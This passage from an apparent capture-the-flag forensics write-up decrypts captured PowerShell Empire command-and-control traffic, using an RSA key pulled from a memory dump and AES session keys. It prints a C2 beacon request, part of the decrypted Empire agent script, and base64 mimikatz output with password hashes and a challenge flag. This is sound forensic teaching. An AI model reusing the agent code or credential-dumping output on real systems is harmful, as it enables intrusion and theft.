</span></span><span style="display:flex;"><span>enc_data <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;8e15a81b0cb93c54dd4cbf8cf105cd5727b1d0c7af9c952546a5c05324617d21d468b464582ed8f156fbeb3b0d3a377e1416aeb21d8c013830141e4383f4bf4855ba5eb156f0aeefda62883d646a0a446a16bc94ddd7780cca739cc5c28dd7caf3783822060555c4f0d0f5e0f9044ad2ce452addde11c335489611c588f0e47347273e23e29d4fd956fd3846b57d62027774b33a9d963d55e00dcc018f95400d25852db856f0be9bf3816c94ea12ab9aa8db5217e20352995025b81dbaa23c2f253804bdcd48e4662cd5f035112de674d2572a70958c2a96c1a06bd767b933841d4204dd6558314f7ded14fb9633919afaf1fa214ac95e6ccfa053b749fc61be80c8e2e2bc416dc5c6af88fa44552b12a3f6e138c10cbccaacc5df76eb282961b2696876b312c6bff0da82e81c9694776481a47b923a26e62f5486e09878595ff7480677124fedd7404e9fb15d769cacc64dfbbbb1c527e6ef7ce1166a39ffc015ec9a3f6e88ed47e30e729f290787fa424ef98c50705c31216b9e5d9723a11eeeccc76325ce32b1b5f6b5fb1deb1861544f7484607d2ecdf25abad79d1900d8cab257e1b7290ce5dbc7211d45c547c3f0972ba228daddd6728aba0b36a70bdbc2cd95a3f56b2efd5e684042a721&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>encr_data <span style="color:#f92672">=</span> bytes<span style="color:#f92672">.</span>fromhex(enc_data)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>decrypted_text <span style="color:#f92672">=</span> aes_decrypt(encr_data[<span style="color:#ae81ff">20</span>:], key)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;[+] AES Decrypted:&#34;</span>, decrypted_text)
</span></span></code></pre></div><p>Running it, we get:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">└─$</span> python rc4_decrypt<span style="color:#f92672">.</span>py
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">+</span>] AES Decrypted: <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&lt;RSAKeyValue&gt;&lt;Modulus&gt;xzZdhYfhAmxwd+qFhfLfXuIAJsQeE5tVsFO0zKXbnwytKA+1wkZIGpO6QsTuJ3FAeTdOJjbypnBBDtuuPj/VfHl62Odn95LemkFqKLig13zaGLWd9Cn26ZyobbMfavrySKT+jFgNPaCYpvVLOyAeHZJa1/sGr0E/AdUGhG1l5tWmlm4Kl4Qe5yXp/ySpFflA0W/AzYVtVndm5tiC5GTGuy3Nes+Wedl0wMM9cMrVGusyawdre2B5VtjuuAFSUKlbEoSyxBhCDpJ0t+wHidBnRZzu9nS6J9wWYr/iT6xufZELpSGw56oIQGwp1mTcAjCQ7urtp6lvRJ7nm+Gat38JTQ==&lt;/Modulus&gt;&lt;Exponent&gt;AQAB&lt;/Exponent&gt;&lt;/RSAKeyValue&gt;</span><span style="color:#ae81ff">\x01\x00\xe4\x9c</span><span style="color:#e6db74">t</span><span style="color:#ae81ff">\xb3\x0e\xd0\xd8</span><span style="color:#e6db74">o</span><span style="color:#ae81ff">\xdd</span><span style="color:#e6db74">J82_</span><span style="color:#ae81ff">\xe8</span><span style="color:#e6db74">&lt;&#39;</span>
</span></span></code></pre></div><p>We are met with an RSA public key. The article indicates that in the STAGE 1 traffic, an RSA PEM was sent in the request and the response was encrypted with the RSA private key. The article suggests that using the RSA public key we could decrypt the response, something that I did not manage to do. Now what?</p>
<h2 id="stage-1---extracting-rsa-privkey-from-minidump">Stage 1 - Extracting RSA PrivKey from minidump<a hidden class="anchor" aria-hidden="true" href="#stage-1---extracting-rsa-privkey-from-minidump">#</a></h2>
<p>Recall that along with the pcap file, we were given a powershell minidump of the victims machine. I also recalled a similar challenge from HTB were you had to extract a key from a powershell minidump to decrypt traffic, so i thought this might be the case. I tried a bunch of tools and I got lucky with the following tool:</p>
<ul>
<li><a href="https://github.com/naacbin/CovenantDecryptor/blob/main/extract_privatekey.py">https://github.com/naacbin/CovenantDecryptor/blob/main/extract_privatekey.py</a></li>
</ul>
<p>This repository also has a script to decrypt the whole traffic, but there is no fun in that!<br>
So what I did was to convert to a number the base64 modulus N from the public key and use that with the tool to get the factors <code>p</code> and <code>q</code>. But truth is, I don&rsquo;t even need to get the factors separately to recreate the private key - the tool takes care of that providing a final privkey.pem file.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">└─$</span> python extract_private_key<span style="color:#f92672">.</span>py <span style="color:#f92672">-</span>i powershell<span style="color:#f92672">.</span>DMP <span style="color:#f92672">-</span>m <span style="color:#ae81ff">25148231226098036568609085786032493445047970858838750757353784046851780996252815164646595354657712347303902433050994584748229413761156337576101444810190533703870848976912366148228482653348855081349089844894215870541245746763769526279157470729874284392842948681388833599108264376759680056204274109786502052449471112587419970215023968989031953153074974224971309706651080504728448055280751647021310124504423016412562368406349427252523767629273098705526800196895955775193783311406083938956019398407824378637691235681260892457410354167254736588107208133326588940908108092201039005698412773934207300784362999497054207543629</span> <span style="color:#f92672">-</span>o <span style="color:#f92672">./</span>
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">-</span>] A pair of P <span style="color:#f92672">and</span> Q were located, but they do <span style="color:#f92672">not</span> <span style="color:#66d9ef">match</span> the modulus<span style="color:#f92672">.</span>
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">-</span>] A pair of P <span style="color:#f92672">and</span> Q were located, but they do <span style="color:#f92672">not</span> <span style="color:#66d9ef">match</span> the modulus<span style="color:#f92672">.</span>
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">-</span>] A pair of P <span style="color:#f92672">and</span> Q were located, but they do <span style="color:#f92672">not</span> <span style="color:#66d9ef">match</span> the modulus<span style="color:#f92672">.</span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> 
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">150956452089032925291860870726198111603099541025300342333620399744356915258819492908817503860740117387753537741614261518421211406637997667084060302456525289568916888709137393722618808502204768902619690472878363471641168599211223</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">012394804175169720239746303980466444986602638061450001494265915151494105179625839</span>
</span></span><span style="display:flex;"><span>q <span style="color:#f92672">=</span> 
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">166592622429055288486164345109844143518609430500796394935657230876873251019149580311937449492539553993684365940867416075970157500630000590374888054804987267317822674555104708403999018304929733771124856592150400779922363207718221</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">865544295510633783738240215332006595869963087595654764820798172520369633815204611</span>
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">+</span>] Saved private key <span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>connar<span style="color:#f92672">/</span>Downloads<span style="color:#f92672">/</span>empireAtRisk<span style="color:#f92672">/</span>privkey1<span style="color:#f92672">.</span>pem
</span></span></code></pre></div><h2 id="stage-1---rsa-decryption-to-get-empires-nonce-and-sessionkey">Stage 1 - RSA decryption to get Empire&rsquo;s nonce and SessionKey<a hidden class="anchor" aria-hidden="true" href="#stage-1---rsa-decryption-to-get-empires-nonce-and-sessionkey">#</a></h2>
<p>Now that we have the private key, let&rsquo;s try and decrypt the response bytes with it. I tried extracting the <code>d</code> value to manually decrypt, but then reading through the <a href="https://pycryptodome-master.readthedocs.io/en/latest/src/cipher/pkcs1_v1_5.html#pkcs-1-v1-5-encryption-rsa">docs</a> of how to use the .pem key itself for decryption, i got a more clean result:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto <span style="color:#f92672">import</span> Random
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.PublicKey <span style="color:#f92672">import</span> RSA
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Cipher <span style="color:#f92672">import</span> PKCS1_v1_5
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>encr <span style="color:#f92672">=</span> bytes<span style="color:#f92672">.</span>fromhex(<span style="color:#e6db74">&#34;7b9d30638cc89a527ed9e5608c5ee485d157f62fc1b7efc4d8858c16a0981f9b54321f6b841b665a414948b0eec1d3a706d5210636ca2b17ee24291a1d3eaa6045ccf3e7cfd3b6b14f43eda80c430b3daae82073119906896b312b8925e668b3cff27f67e603a36144b7647de7a6841f55c3a6b89ecc0ac4d3a5596b66b7e96e546657cf67d3e6457a5290babf190d9caea03a5603ce8dea7d4bad7d79b04e6845b1760c8272f3d1b6d930e0d643defc48050e7350e53995566ff2e66994627cc553002efea8bb3f0f7326b942587633c2b7c85f50c2e7d6a91ef29e985e38191968fcda843332972f87586413ad2a840bd601b77b817e91d0378d63e52b9c98&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>f <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#39;privkey1.pem&#39;</span>,<span style="color:#e6db74">&#39;r&#39;</span>)
</span></span><span style="display:flex;"><span>key <span style="color:#f92672">=</span> RSA<span style="color:#f92672">.</span>importKey(f<span style="color:#f92672">.</span>read())
</span></span><span style="display:flex;"><span>cipher <span style="color:#f92672">=</span> PKCS1_v1_5<span style="color:#f92672">.</span>new(key)
</span></span><span style="display:flex;"><span>sentinel <span style="color:#f92672">=</span> Random<span style="color:#f92672">.</span>new()<span style="color:#f92672">.</span>read(<span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span>decrypted <span style="color:#f92672">=</span> cipher<span style="color:#f92672">.</span>decrypt(encr, sentinel)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;nonce: </span><span style="color:#e6db74">{</span>decrypted[:<span style="color:#ae81ff">16</span>]<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">SessionKey: </span><span style="color:#e6db74">{</span>decrypted[<span style="color:#ae81ff">16</span>:]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span></code></pre></div><p>Running it, we get the nonce and the SessionKey:</p>
<pre tabindex="0"><code>└─$ python rsa_privkey_decrypt.py
nonce: b&#39;6486863263721433&#39;
SessionKey: b&#39;d%~gc_:vhZP+.VHWsolQEz1}ICKma;D@&#39;
</code></pre><p>And we got two values that look promising - promising in the sense that they look like values that the post was showcasing. These values according to the post, will now be used to decrypt the rest of the packets with AES.CBC with the <code>nonce</code> as the <code>IV</code> and the <code>SessionKey</code> as the new <code>Key</code>. We are now ready to proceed to STAGE 2!</p>
<h1 id="stage-2---decrypting-rest-of-the-packets">Stage 2 - Decrypting rest of the packets<a hidden class="anchor" aria-hidden="true" href="#stage-2---decrypting-rest-of-the-packets">#</a></h1>
<p>We move to the third Request - Response pair where we will try to decrypt the first 20 bytes again to verify we are at the third stage (STAGE 2):</p>
<pre tabindex="0"><code>POST /admin/get.php HTTP/1.1
Cookie: RYbfHA=PmLsmcRe+Q/gzLQbJmNo6qBFeXg=
Hop-Name: 
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
Host: 77.74.198.52:8083
Content-Length: 222

......%Dg..D.&amp;..ua..`V..6.&amp;T....&gt;.:)M{. .&#34;yw..vg}.y..D...q.}Zr..z.
h&gt;.8s@..4...&gt;.P.[.....q...Q....h.......T..
.KI@.

.(C.b.v......YF{:..O.....|(.B..O...,,s.P],h....%.`vTk..|:.L...Z..,..y56.K...G.........o..... .|.......:..HTTP/1.1 200 OK
Server: Werkzeug/2.1.2 Python/3.9.13
Date: Tue, 30 Aug 2022 16:35:52 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 41402
Cache-Control: no-cache, no-store, must-revalidate
Pragma: no-cache
Expires: 0
Server: Microsoft-IIS/7.5
Connection: close

.hE
.e..1....&#34;.F.......$C.Lu....!Z.&lt;7...f..bV..)...@..7........q(	S.Dy.{....%ROX.F.L/.?....$J..4.s.z[.....V...a....t..4.;R. .....L..&#34;D.g.z....._p[..s..............&gt;.@{.^.x....tP..|...%..M..tr/V9,.q....|~#w..hk*.wfd..X...pb..W&#34;......Z&#34;...r&gt;DJ.......t/(&amp;MJ..U....nQ.....$.s.(j.;...............&lt;....V.....1...E.......Lu...!...+3.J.0r.....8t..X]..;.....^.....&lt;.|....g3=..1...V.Y.Qj...g......v2l(.t.a.!s..s... ..7
.R...P......D.hp...FE......p..4.[..O~.B..&#39;...L.....:.@8...z....M.......c...B.&gt;..x.x........,.sGCl.i?^...|7.^%..g...[PXhc
..i.]-0.!7&lt;.....q....k..RX..B.C..x.QNz9.3...!,]..U..N.Q0f..&#39;.!&amp;.r.}U...&amp;.Q.=..Mm...a...g.................ZV...........SLZ
...d....8e.+_.......7..&amp;.P.....k&#34;..._..
.jk.
;.:.....o.R.K#.C..m)...^J..$...r5,M
u.i..DRd....... .....}.A...u}....Miw..S..(..P...G@d.@.D.....Ty.ve.....qF.....r......=.9........%.y.f(..........
p).......I.,Ft..&gt;.m.GK..&#39;...m..*..P...&#34;...b&#34;.#q --more bytes--
</code></pre><p>Running our previous <code>rc4-decrypt.py</code> script, we indeed get the feedback that we are in the final stage:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">└─$</span> python rc4_decrypt<span style="color:#f92672">.</span>py        
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">+</span>] RC4 Decrypted: <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;EBXWPAHZ</span><span style="color:#ae81ff">\x01\x03\x00\x00\xca\x00\x00</span><span style="color:#e6db74">&#39;</span>
</span></span></code></pre></div><p>We will now get the response bytes and decrypt them using <code>AES.CBC</code> with the <code>nonce</code> and <code>SessionKey</code> we previously found. Using a previous script I made for the AES.CBC decryption - now updated with the new values, we end up with:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Cipher <span style="color:#f92672">import</span>  AES
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Util.Padding <span style="color:#f92672">import</span> pad, unpad
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">aes_decrypt</span>(ciphertext, key):
</span></span><span style="display:flex;"><span>    ciphertext <span style="color:#f92672">=</span> pad(ciphertext, AES<span style="color:#f92672">.</span>block_size)
</span></span><span style="display:flex;"><span>    iv <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;6486863263721433&#39;</span>
</span></span><span style="display:flex;"><span>    cipher <span style="color:#f92672">=</span> AES<span style="color:#f92672">.</span>new(key, AES<span style="color:#f92672">.</span>MODE_CBC, iv)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    plaintext <span style="color:#f92672">=</span> cipher<span style="color:#f92672">.</span>decrypt(ciphertext[<span style="color:#ae81ff">16</span>:])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> plaintext
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>key <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;d%~gc_:vhZP+.VHWsolQEz1}ICKma;D@&#39;</span>
</span></span><span style="display:flex;"><span>enc_data <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;1368450d8e65198d31b9e1bba522cb4611f9d89 --rest of response bytes--&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>encr_data <span style="color:#f92672">=</span> bytes<span style="color:#f92672">.</span>fromhex(enc_data)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>decrypted_text <span style="color:#f92672">=</span> aes_decrypt(encr_data, key)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;[+] AES Decrypted:&#34;</span>, decrypted_text)
</span></span></code></pre></div><p>Running it, we get:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">└─</span>$ python aes_decrypt.py 
</span></span><span style="display:flex;"><span>[+] AES Decrypted<span style="color:#960050;background-color:#1e0010">:</span> b<span style="color:#e6db74">&#39;C)\x13X\xc2:E\xd1\&#39;</span>\xc6\x84\xcf\xc0!\xd8\x0e\n    <span style="color:#66d9ef">param</span>(\n        [Parameter(<span style="color:#a6e22e">Mandatory</span>=$true)]\n        [<span style="color:#66d9ef">String</span>]\n        $StagingKey,\n        [Parameter(<span style="color:#a6e22e">Mandatory</span>=$true)]\n        [<span style="color:#66d9ef">String</span>]\n        $SessionKey,\n        [Parameter(<span style="color:#a6e22e">Mandatory</span>=$true)]\n        [<span style="color:#66d9ef">String</span>]\n        $SessionID,\n        [<span style="color:#66d9ef">Int32</span>]\n        $AgentDelay = <span style="color:#ae81ff">5</span>,\n        [<span style="color:#66d9ef">Double</span>]\n        $AgentJitter = <span style="color:#ae81ff">0.0</span>,\n        [<span style="color:#66d9ef">String[]</span>]\n        $Servers,\n        [<span style="color:#66d9ef">String</span>]\n        $KillDate,\n        [<span style="color:#66d9ef">Int32</span>]\n        $KillDays,\n        [<span style="color:#66d9ef">String</span>]\n        $WorkingHours,\n        [<span style="color:#66d9ef">object</span>]\n        $ProxySettings,\n        [<span style="color:#66d9ef">String</span>]\n        $Profile = <span style="color:#e6db74">&#34;/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko&#34;</span>,\n        [<span style="color:#66d9ef">Int32</span>]\n        $LostLimit = <span style="color:#ae81ff">60</span>,\n        [<span style="color:#66d9ef">String</span>]\n        $DefaultResponse = <span style="color:#e6db74">&#34;PCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBYSFRNTCAxLjAgU3RyaWN0Ly9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL3hodG1sMS9EVEQveGh0bWwxLXN0cmljdC5kdGQiPgo8aHRtbCB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94aHRtbCI+CjxoZWFkPgogICAgPG1ldGEgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PWlzby04ODU5LTEiIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIvPgogICAgPHRpdGxlPjQwNCAtIEZpbGUgb3IgZGlyZWN0b3J5IG5vdCBmb3VuZC48L3RpdGxlPgogICAgPHN0eWxlIHR5cGU9InRleHQvY3NzIj4KPCEtLQpib2R5e21hcmdpbjowO2ZvbnQtc2l6ZTouN2VtO2ZvbnQtZmFtaWx5OlZlcmRhbmEsIEFyaWFsLCBIZWx2ZXRpY2EsIHNhbnMtc2VyaWY7YmFja2dyb3VuZDojRUVFRUVFO30KZmllbGRzZXR7cGFkZGluZzowIDE1cHggMTBweCAxNXB4O30gCmgxe2ZvbnQtc2l6ZToyLjRlbTttYXJnaW46MDtjb2xvcjojRkZGO30KaDJ7Zm9udC1zaXplOjEuN2VtO21hcmdpbjowO2NvbG9yOiNDQzAwMDA7fSAKaDN7Zm9udC1zaXplOjEuMmVtO21hcmdpbjoxMHB4IDAgMCAwO2NvbG9yOiMwMDAwMDA7fSAKI2hlYWRlcnt3aWR0aDo5NiU7bWFyZ2luOjAgMCAwIDA7cGFkZGluZzo2cHggMiUgNnB4IDIlO2ZvbnQtZmFtaWx5OiJ0cmVidWNoZXQgTVMiLCBWZXJkYW5hLCBzYW5zLXNlcmlmO2NvbG9yOiNGRkY7CmJhY2tncm91bmQtY29sb3I6IzU1NTU1NTt9CiNjb250ZW50e21hcmdpbjowIDAgMCAyJTtwb3NpdGlvbjpyZWxhdGl2ZTt9Ci5jb250ZW50LWNvbnRhaW5lcntiYWNrZ3JvdW5kOiNGRkY7d2lkdGg6OTYlO21hcmdpbi10b3A6OHB4O3BhZGRpbmc6MTBweDtwb3NpdGlvbjpyZWxhdGl2ZTt9Ci0tPgogICAgPC9zdHlsZT4KPC9oZWFkPgo8Ym9keT4KPGRpdiBpZD0iaGVhZGVyIj48aDE+U2VydmVyIEVycm9yPC9oMT48L2Rpdj4KPGRpdiBpZD0iY29udGVudCI+CiAgICA8ZGl2IGNsYXNzPSJjb250ZW50LWNvbnRhaW5lciI+CiAgICAgICAgPGZpZWxkc2V0PgogICAgICAgICAgICA8aDI+NDA0IC0gRmlsZSBvciBkaXJlY3Rvcnkgbm90IGZvdW5kLjwvaDI+CiAgICAgICAgICAgIDxoMz5UaGUgcmVzb3VyY2UgeW91IGFyZSBsb29raW5nIGZvciBtaWdodCBoYXZlIGJlZW4gcmVtb3ZlZCwgaGFkIGl0cyBuYW1lIGNoYW5nZWQsIG9yIGlzIHRlbXBvcmFyaWx5CiAgICAgICAgICAgICAgICB1bmF2YWlsYWJsZS48L2gzPgogICAgICAgIDwvZmllbGRzZXQ+CiAgICA8L2Rpdj4KPC9kaXY+CjwvYm9keT4KPC9odG1sPg==&#34;</span>\n    )\n    $Encoding = [<span style="color:#66d9ef">System.Text.Encoding</span>]::ASCII\n    $HMAC = New-Object System.Security.Cryptography.HMACSHA256\n    $script:AgentDelay = $AgentDelay\n    $script:AgentJitter = $AgentJitter\n    $script:LostLimit = $LostLimit\n    $script:MissedCheckins = <span style="color:#ae81ff">0</span>\n    $script:ResultIDs = @{}\n    $script:WorkingHours  -- a lot more --
</span></span></code></pre></div><p>Although no flag can be seen in the decrypted data, we now have the <code>IV</code> and <code>Key</code> to decrypt all the other packets. There was one HTTP packet that had a huge size so I thought of trying decrypting that. I had some difficulties at first, but eventually modified my decryption to decrypt from the 20th byte onwards and it worked:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#75715e"># key is the SessionKey we found</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">aes_decrypt</span>(ciphertext, key):
</span></span><span style="display:flex;"><span>    ciphertext <span style="color:#f92672">=</span> pad(ciphertext, AES<span style="color:#f92672">.</span>block_size)
</span></span><span style="display:flex;"><span>    iv <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;6486863263721433&#39;</span>
</span></span><span style="display:flex;"><span>    cipher <span style="color:#f92672">=</span> AES<span style="color:#f92672">.</span>new(key, AES<span style="color:#f92672">.</span>MODE_CBC, iv)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># first 20 bytes are metadata encrypted with the RC4 key. Last 10 are HMAC SHA 256 verification data</span>
</span></span><span style="display:flex;"><span>    plaintext <span style="color:#f92672">=</span> cipher<span style="color:#f92672">.</span>decrypt(pad(ciphertext[<span style="color:#ae81ff">20</span>:], AES<span style="color:#f92672">.</span>block_size))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> plaintext
</span></span></code></pre></div><p>Running it, we get:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">─$</span> python aes_decrypt<span style="color:#f92672">.</span>py
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">+</span>] AES Decrypted: <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;|It</span><span style="color:#ae81ff">\xbd</span><span style="color:#e6db74">K</span><span style="color:#ae81ff">\x96\xaa</span><span style="color:#e6db74">W_</span><span style="color:#ae81ff">\xd0</span><span style="color:#e6db74">G)</span><span style="color:#ae81ff">\x93\xa8\x0f\xdd</span><span style="color:#e6db74">n</span><span style="color:#ae81ff">\x00\x01\x00\x01\x00\x07\x00\xac</span><span style="color:#e6db74">&amp;</span><span style="color:#ae81ff">\x00\x00</span><span style="color:#e6db74">SG9zdG5hbWU6IHNhdGVsbGl0ZS0yMzQxLkNPUlAubG9jYWwgLyBTLTEtNS0yMS0yODg2NDAyNDAtNDE0MzE2MDc3NC00MTkzNDc4MDExDQoKICAuIyMjIyMuICAgbWltaWthdHogMi4yLjAgKHg2NCkgIzE5MDQxIE5vdiAyMCAyMDIxIDA4OjI4OjA2CiAuIyMgXiAjIy4gICJBIExhIFZpZSwgQSBMJ0Ftb3VyIiAtIChvZS5lbykKICMjIC8gXCAjIyAgLyoqKiBCZW5qYW1pbiBERUxQWSBgZ2VudGlsa2l3aWAgKCBiZW5qYW1pbkBnZW50aWxraXdpLmNvbSApCiAjIyBcIC8gIyMgICAgICAgPiBodHRwczovL2Jsb2cuZ2VudGlsa2l3aS5jb20vbWltaWthdHoKICcjIyB2ICMjJyAgICAgICBWaW5jZW50IExFIFRPVVggICAgICAgICAgICAgKCB2aW5jZW50LmxldG91eEBnbWFpbC5jb20gKQogICcjIyMjIycgICAgICAgID4gaHR0cHM6Ly9waW5nY2FzdGxlLmNvbSAvIGh0dHBzOi8vbXlzbWFydGxvZ29uLmNvbSAqKiovCgptaW1pa2F0eihwb3dlcnNoZWxsKSAjIHNla3VybHNhOjpsb2dvbnBhc3N3b3JkcwoKQXV0aGVudGljYXRpb24gSWQgOiAwIDsgMzMyNTUwICgwMDAwMDAwMDowMDA1MTMwNikKU2Vzc2lvbiAgICAgICAgICAgOiBJbnRlcmFjdGl2ZSBmcm9tIDEKVXNlciBOYW1lICAgICAgICAgOiBTYXRBZG1pbmlzdHJhdG9yCkRvbWFpbiAgICAgICAgICAgIDogQ09SUApMb2dvbiBTZXJ2ZXIgICAgICA6IENPUlAtREMKTG9nb24gVGltZSAgICAgICAgOiA4LzMwLzIwMjIgMTI6MzM6MzAgUE0KU0lEICAgICAgICAgICAgICAgOiBTLTEtNS0yMS0yODg2NDAyNDAtNDE0MzE2MDc3NC00MTkzNDc4MDExLTExMTQKCW1zdiA6CQoJIFswMDAwMDAwM10gUHJpbWFyeQoJICogVXNlcm5hbWUgOiBTYXRBZG1pbmlzdHJhdG9yCgkgKiBEb21haW4gICA6IENPUlAKCSAqIE5UTE0gICAgIDogYTlmZGZhMDM4YzRiNzVlYmM3NmRjODU1ZGQ3NGYwZGEKCSAqIFNIQTEgICAgIDogOTQwMGFlMjg0NDhlMTM2NDE3NGRkZTI2OWIyY2NlMWJjYTlkN2VlOAoJICogRFBBUEkgICAgOiBmZDExYWQzZGM0MzMzMTkwMTA5YzE1ZGI5MzFhM2I0YQoJdHNwa2cgOgkKCXdkaWdlc3QgOgkKCSAqIFVzZXJuYW1lIDogU2F0QWRtaW5pc3RyYXRvcgoJICogRG9tYWluICAgOiBDT1JQCgkgKiBQYXNzd29yZCA6IChudWxsKQoJa2VyYmVyb3MgOgkKCSAqIFVzZXJuYW1lIDogU2F0QWRtaW5pc3RyYXRvcgoJICogRG9tYWluICAgOiBDT1JQLkxPQ0FMCgkgKiBQYXNzd29yZCA6IChudWxsKQoJc3NwIDoJCgljcmVkbWFuIDoJCgkgWzAwMDAwMDAwXQoJICogVXNlcm5hbWUgOiBBZG1pbmlzdHJhdG9yCgkgKiBEb21haW4gICA6IGNvcnAtZGMKCSAqIFBhc3N3b3JkIDogSFRCe3RoM18zbXAxcjNfRjFuNGxseV9DMGxsNHBzM2R9CgljbG91ZGFwIDoJCgpBdXRoZW50aWNhdGlvbiBJZCA6IDAgOyAzMzI1MTggKDAwMDAwMDAwOjAwMDUxMmU2KQpTZXNzaW9uICAgICAgICAgICA6IEludGVyYWN0aXZlIGZyb20gMQpVc2VyIE5hbWUgICAgICAgICA6IFNhdEFkbWluaXN0cmF0b3IKRG9tYWluICAgICAgICAgICAgOiBDT1JQCkxvZ29uIFNlcnZlciAgICAgIDogQ09SUC1EQwpMb2dvbiBUaW1lICAgICAgICA6IDgvMzAvMjAyMiAxMjozMzozMCBQTQpTSUQgICAgICAgICAgICAgICA6IFMtMS01LTIxLTI4ODY0MDI0MC00MTQzMTYwNzc0LTQxOTM0NzgwMTEtMTExNAoJbXN2IDoJCgkgWzAwMDAwMDAzXSBQcmltYXJ5CgkgKiBVc2VybmFtZSA6IFNhdEFkbWluaXN0cmF0b3IKCSAqIERvbWFpbiAgIDogQ09SUAoJICogTlRMTSAgICAgOiBhOWZkZmEwMzhjNGI3NWViYzc2ZGM4NTVkZDc0ZjBkYQoJICogU0hBMSAgICAgOiA5NDAwYWUyODQ0OGUxMzY0MTc0ZGRlMjY5YjJjY2UxYmNhOWQ3ZWU4CgkgKiBEUEFQSSAgICA6IGZkMTFhZDNkYzQzMzMxOTAxMDljMTVkYjkzMWEzYjRhCgl0c3BrZyA6CQoJd2RpZ2VzdCA6CQoJICogVXNlcm5hbWUgOiBTYXRBZG1pbmlzdHJhdG9yCgkgKiBEb21haW4gICA6IENPUlAKCSA